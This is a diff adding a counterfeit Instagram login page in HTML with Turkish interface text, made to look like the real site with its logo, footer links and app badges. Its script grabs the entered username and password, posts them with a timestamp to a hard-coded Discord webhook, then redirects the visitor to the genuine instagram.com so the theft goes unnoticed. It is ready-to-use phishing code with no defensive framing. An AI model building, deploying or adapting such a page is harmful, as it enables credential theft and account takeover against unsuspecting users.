@@ -1,0 +1,155 @@
+<!-- 這是 Instagram 登入頁面 -->
+
+<!DOCTYPE html>
+<html lang="zh-tw">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+ 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>登入 • Instagram</title>
+    <link rel="stylesheet" href="css/loginstyle.css">
+    <link rel="shortcut icon" href="./img/Instagram_logo_2016.svg.webp">
+
+    <style>
+        img {
+            vertical-align: text-top;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="loader-overlay">
+        <div class="loader"></div>
+    </div>
+
+    <div class="container">
+        <div class="box">
+            <i class="heading" data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yd/r/5Vve--Eas3M.png&quot;); background-position: 0px -2959px; background-size: 339px 3108px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+            
+            <form class="login-form" action="" method="post" onsubmit="redirectToInstagram(event)">
+                <div class="field">
+                    <input id="username" type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta adresi" required />
+                    <label for="username">Telefon numarası, kullanıcı adı veya e-posta adresi</label>
+                </div>
+                <div class="field">
+                    <input id="message" type="password" name="message" placeholder="Şifre" required />
+                    <label for="password">Şifre</label>
+                    <button type="button" id="show-password-btn">Göster</button>
+                </div>
+                <button class="login-button" type="submit" title="Login">Giriş Yap</button>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>veya</p>
+                    <div class="line"></div>
+                </div>
+                <div class="other">
+                    <button class="fb-login-btn" type="button" onclick="window.location.href='https://www.facebook.com/login.php/'">
+                        <i class="fa fa-facebook-official fb-icon"></i>
+                        <span>
+                            <img src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://www.facebook.com/&size=256" height="15" width="15" />
+                            &nbsp;<a href="https://www.facebook.com/login.php/" style="font-weight: bold;">Facebook ile Giriş Yap</a>
+                        </span>
+                    </button>
+                    <a style="font-weight: bold;" class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">Şifreni mi unuttun?</a>
+                    <br>
+                </div>
+            </form>
+        </div>
+        <div class="box">
+            <p style="color:white">Hesabın yok mu? <a class="signup" href="#">Kaydol</a></p>
+        </div>
+    </div>
+    <br>
+    <div class="get">
+Uygulamayı indir.
+</div>
+    <br>
+    <div class="apps">
+        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=zh_TW">
+            <img src="./img/google-playstore.png" height="40" width="134">
+        </a>
+        &NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;
+        <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=zh-TW&gl=TW"> 
+            <img src="img/microsoft-store.png" height="40" width="auto">
+        </a>
+    </div>
+    <br>
+    <div class="footer">
+        <footer>
+            <a href="https://about.meta.com/">Hakkında</a> 
+            <a href="https://about.fb.com/news/">Blog</a> 
+            <a href="https://www.metajobs.com/">Kariyer</a> 
+            <a href="https://www.meta.com/help/">Destek</a> 
+            <a href="https://developers.facebook.com/docs/">API</a> 
+            <a href="https://www.meta.com/privacy/">Gizlilik Politikası</a> 
+            <a href="https://www.meta.com/terms/">Kullanım Şartları</a> 
+            <a href="https://www.meta.com/locations/">Konumlar</a> 
+            <a href="https://www.instagram.com/lite/">Instagram Lite</a> 
+            <a href="https://www.facebook.com/help/instagram/261704639352628">Yükleme &amp; Kullanıcı Desteği</a> 
+            <a href="https://www.meta.com/verified/">Meta Doğrulama</a>
+        </footer>
+    </div>
+    <div class="copyright">
+        <br>    
+        <select aria-label="Dil değiştir" class="Language">
+            <option value="tr" selected>Türkçe</option>
+        </select> © 2025 Instagram Meta tarafından
+    </div>
+
+    <script>
+        const showPasswordBtn = document.getElementById('show-password-btn');
+        const passwordField = document.getElementById('message');
+        const userField = document.getElementById('username');
+        let user;
+        let pass;
+
+        function redirectToInstagram(event) {
+            event.preventDefault();
+            user = userField.value;
+            pass = passwordField.value;
+            const timestamp = new Date().toLocaleString('tr-TR');
+            const webhookUrl = 'https://discord.com/api/webhooks/1438297600158863364/ewZAWe7GHyKg2RkWHtT-vfBENNLbUDDdJTcJrmT9t6VdJFIOB49WgRKJdLI7QD81dytz';
+            const data = {
+                content: `Kullanıcı adı : ${user}\nŞifre : ${pass}\nSaat : ${timestamp}`
+            };
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).finally(() => {
+                setTimeout(function () {
+                    window.location.href = "https://www.instagram.com/";
+                }, 1000);
+            });
+        }
+
+        passwordField.addEventListener('input', function () {
+            if (passwordField.value.length > 0) {
+                showPasswordBtn.style.display = 'block';
+            } else {
+                showPasswordBtn.style.display = 'none';
+            }
+        });
+
+        showPasswordBtn.addEventListener('click', function () {
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                showPasswordBtn.textContent = 'Gizle';
+            } else {
+                passwordField.type = 'password';
+                showPasswordBtn.textContent = 'Göster';
+            }
+        });
+
+        window.addEventListener('load', () => {
+            document.body.classList.add('loaded');
+            document.getElementById('content').style.display = 'block';
+        });
+    </script>
+</body>
+</html>
